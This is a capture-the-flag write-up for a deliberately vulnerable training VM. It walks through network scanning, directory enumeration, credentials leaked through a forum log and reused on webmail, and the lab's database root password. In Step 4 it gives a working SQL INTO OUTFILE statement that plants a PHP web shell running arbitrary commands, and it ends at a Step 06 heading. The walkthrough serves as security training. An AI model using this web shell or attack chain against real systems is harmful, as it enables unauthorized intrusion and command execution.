# Writeup 1 - Main Challenge

<br>

## Step 0 - Find the iso ip

To start, you need to know the ip iso to connect to it. Since we've configured the VM to be in the local network,
we look at our network interfaces:
```shell
host:~$ ip a
...
3: vboxnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0
       valid_lft forever preferred_lft forever
...
```
So we can deduce that the ip will be in range `192.168.56.2-255`, let's use `nmap` to find it !
```shell
host:~$ nmap 192.168.56.2-255
...
Nmap scan report for 192.168.56.7
Host is up (0.00019s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
...
```
Yes, We got it. So we can connect through the iso on ip `192.168.56.7`.
> Note: All commands in this topic are executed through the IP address "192.168.56.7".
> Your iso's ip address may be different, so modify the commands accordingly.

<br>

## Step 1 - find a vulnerable doorway.
Now, we know the ip and all open ports. Let's enumerate them:
<br>
-  `21` and `22` are respectively `ftp` and `ssh` ports and we don't have any credential so there aren't useful for the moment.
  
-  On port `80` (http port) we find an interesting information :

![http](images/http.png)

As we deduce the http/https ports might be the path we were expecting to enter the iso. We list the possible paths using `dirb`.

```shell
host:~$ dirb http://192.168.56.7
...
==> DIRECTORY: http://192.168.56.7/fonts/
+ http://192.168.56.7/forum (CODE:403|SIZE:285)                              
+ http://192.168.56.7/index.html (CODE:200|SIZE:1025)                        
+ http://192.168.56.7/server-status (CODE:403|SIZE:293)
...                     
```
We found nothing useful on `80` let's test the `443` port

```shell
host:~$ dirb https://192.168.56.7
...
==> DIRECTORY: https://192.168.56.7/forum/
==> DIRECTORY: https://192.168.56.7/phpmyadmin/
...                     
==> DIRECTORY: https://192.168.56.7/webmail/
...
```
Here we found that we expected, 3 possible doorway: phpmyadmin, webmail (both needed credentials) and ... a private forum with free access to topics !

![forum](images/forum.png)

<br>

## Step 2 - Inspect topics forum

by scrolling through the topics for a few minutes, we discover, in the topic `Problem login?`, a line which seems to be a password (`!q\]Ej?*5K5cy*AJ`) entered by mistake in place of a user login... and just after a success logon with the user `lmezard`:

```shell
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
```

Indeed, by testing, we found that it is the `lmezard`'s forum password!
by logging in with lizard's identifiers on the forum page, we now have access to lmezard's personal information,
and we will discover an email address: `laurie@borntosec.net` !

![email_forum](images/email_forum.png)

Now we have a mail, and we deduce that we can use it on a mail server... and there is one on on port `443` !
For the password, `laurie` isn't smart (like a good proportion of the humanity), she's reused the same password.
So, we connect to her mail.

![webmail](images/webmail.png)

<br>

## Step 3 - Inspect mail box

Here, our job is very simple. Just look in the `DB Access` mail for root (`root/Fg-'kKXBj87E:aJ$`) access to the database,
what more could you ask for !

![](images/db_mail.png)

<br>

## Step 4 - Inspect Database

By logging in with the credentials of `root` on the phpmyadmin page, we get the privilege to access the database.
After some research, we found hashed user passwords on the database, but they are difficult to crack (brute force)
because they are salted. However, we find a potential vulnerability in creating a file to exploit a webshell 
using sql injection.

So we create a php file that can run commands as user www-data on the server with this command:
```shell
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```
BUT ! The `/var/www/phpMyAdmin/` directory is not writable...so we need to find a writable directory. After enumerating the port with dirb and long tests, we find a writable directory: `/var/www/forum/templates_c`
```shell
host:~$ dirb https://192.168.56.7 | grep DIRECTORY
...
==> DIRECTORY: https://192.168.56.7/forum/templates_c/
...
```
So we can use this command successfully:
```shell
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
```

![sql_injection](images/sql_injection.png)

And so, go to the `https://192.168.56.7/forum/templates_c/cmd.php` page with your browser to open a beautiful webshell.
After few minutes of enumeration we found a new `lmezard`'s credentials in `/home/LOOKATME/password` : `lmezard:G!@M6f4Eatau{sF"`

The next step is to find out what service those credentials are being used for...

<br>

## Step 5 - Ftp

We finally found the service the credentials are associated with the service `ftp` on port `21`.
```shell
host:~$ ftp lmezard@192.168.56.7

Connected to 192.168.56.7.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62943|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```
As we see, there are 2 files present, let's get them on the host.
```shell
ftp> get README
local: fun remote: README
229 Entering Extended Passive Mode (|||26123|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |*********************************|    96        2.23 MiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (288.46 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||60919|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |*********************************|   790 KiB  106.11 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (99.79 MiB/s)

...

host:~$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

host:~$ file fun
fun: POSIX tar archive (GNU)
host:~$ tar -xf fun
host:~$ ls -l ft_fun | head -n10
total 3028
-rw-r----- 1 ammah ammah    26 août  13  2015 00M73.pcap
-rw-r----- 1 ammah ammah    28 août  13  2015 01IXJ.pcap
-rw-r----- 1 ammah ammah    28 août  13  2015 0564G.pcap
-rw-r----- 1 ammah ammah    27 août  13  2015 05GXI.pcap
-rw-r----- 1 ammah ammah    44 août  13  2015 08GIC.pcap
-rw-r----- 1 ammah ammah    28 août  13  2015 08UKO.pcap
-rw-r----- 1 ammah ammah    44 août  13  2015 0B2GJ.pcap
-rw-r----- 1 ammah ammah    44 août  13  2015 0D70A.pcap
-rw-r----- 1 ammah ammah    13 août  13  2015 0E2HD.pcap
```

When we look into these files, we find a `main` with some `getme` functions scattered in files
```shell
host:~$ grep -A31 "main" ft_fun/*

ft_fun/BJPCP.pcap:int main() {
ft_fun/BJPCP.pcap-	printf("M");
ft_fun/BJPCP.pcap-	printf("Y");
ft_fun/BJPCP.pcap-	printf(" ");
ft_fun/BJPCP.pcap-	printf("P");
ft_fun/BJPCP.pcap-	printf("A");
ft_fun/BJPCP.pcap-	printf("S");
ft_fun/BJPCP.pcap-	printf("S");
ft_fun/BJPCP.pcap-	printf("W");
ft_fun/BJPCP.pcap-	printf("O");
ft_fun/BJPCP.pcap-	printf("R");
ft_fun/BJPCP.pcap-	printf("D");
ft_fun/BJPCP.pcap-	printf(" ");
ft_fun/BJPCP.pcap-	printf("I");
ft_fun/BJPCP.pcap-	printf("S");
ft_fun/BJPCP.pcap-	printf(":");
ft_fun/BJPCP.pcap-	printf(" ");
ft_fun/BJPCP.pcap-	printf("%c",getme1());
ft_fun/BJPCP.pcap-	printf("%c",getme2());
ft_fun/BJPCP.pcap-	printf("%c",getme3());
ft_fun/BJPCP.pcap-	printf("%c",getme4());
ft_fun/BJPCP.pcap-	printf("%c",getme5());
ft_fun/BJPCP.pcap-	printf("%c",getme6());
ft_fun/BJPCP.pcap-	printf("%c",getme7());
ft_fun/BJPCP.pcap-	printf("%c",getme8());
ft_fun/BJPCP.pcap-	printf("%c",getme9());
ft_fun/BJPCP.pcap-	printf("%c",getme10());
ft_fun/BJPCP.pcap-	printf("%c",getme11());
ft_fun/BJPCP.pcap-	printf("%c",getme12());
ft_fun/BJPCP.pcap-	printf("\n");
ft_fun/BJPCP.pcap-	printf("Now SHA-256 it and submit");
ft_fun/BJPCP.pcap-}

host:~$ grep -A2 "getme" ft_fun/*
...
--
ft_fun/91CD0.pcap:char getme6() {
ft_fun/91CD0.pcap-
ft_fun/91CD0.pcap-//file521
--
ft_fun/B62N4.pcap:char getme3() {
ft_fun/B62N4.pcap-
ft_fun/B62N4.pcap-//file56
--
ft_fun/BJPCP.pcap:char getme8() {
ft_fun/BJPCP.pcap-	return 'w';
ft_fun/BJPCP.pcap-}
--
ft_fun/BJPCP.pcap:char getme9() {
ft_fun/BJPCP.pcap-	return 'n';
ft_fun/BJPCP.pcap-}
--
...

```
When we cat 0T16C.pcap the function was not complete but a comment was present with the file number,
we just had to grep the following file to get the rest of the function. Here is an example:
```shell
host:~$ cat 0T16C.pcap
char getme4() {

//file115%

host:~$ grep "//file116" *
7DT5Q.pcap://file116

host:~$ cat 7DT5Q.pcap
	return 'a';

//file116%

host:~$ grep "//file117" *
HEQ6R.pcap://file117

host:~$ cat HEQ6R.pcap
}

//file117%
```
So that's the trick ! Copy `laurie.sh` and `laurie.py` in `ft_fun` file and run `laurie.sh` to get the ssh laurie's password.
We are know into the server !
```shell

host:~$ cp Security-Pentest-Part-II/scripts/laurie.* ft_fun/. 
host:~$ (cd ft_fun && bash laurie.sh) 
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

<br>

## Step 06 - get into the monster
